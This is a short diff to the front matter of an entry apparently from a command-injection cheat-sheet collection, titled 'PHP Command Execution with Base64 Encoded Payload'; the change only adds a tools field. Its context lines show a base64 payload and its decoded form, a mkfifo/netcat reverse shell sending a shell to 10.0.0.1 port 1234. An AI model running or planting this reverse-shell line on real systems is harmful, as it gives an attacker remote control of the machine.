@@ -10,6 +10,8 @@ output: 'root@hackers:~# echo -n "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZn
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f'
 created_at: '2019-09-17T19:34:48.769552+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[CAT]]'
 ---
 
 # PHP Command Execution with Base64 Encoded Payload
